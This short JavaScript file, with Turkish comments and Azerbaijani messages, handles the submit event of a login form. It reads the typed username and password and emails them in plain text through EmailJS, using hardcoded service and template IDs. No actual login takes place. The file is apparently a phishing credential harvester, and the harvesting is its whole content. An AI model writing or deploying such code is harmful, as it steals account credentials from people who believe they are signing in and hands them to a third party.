document.getElementById('login-form').addEventListener('submit', function(event) {
    event.preventDefault();

    // Form verilerini al
    const username = document.querySelector('.login_name').value;
    const password = document.querySelector('.login__password').value;

    // EmailJS parametreleri
    const templateParams = {
        username: username,
        password: password
    };

    emailjs.send('service_obem5j6', 'template_hh64r8q', templateParams)
        .then(function(response) {
            console.log('SUCCESS!', response.status, response.text);
            alert('Məlumatlar uğurla göndərildi!');
        }, function(error) {
            console.log('FAILED...', error);
            alert('Məlumatlar göndərilə bilmədi');
        });

});
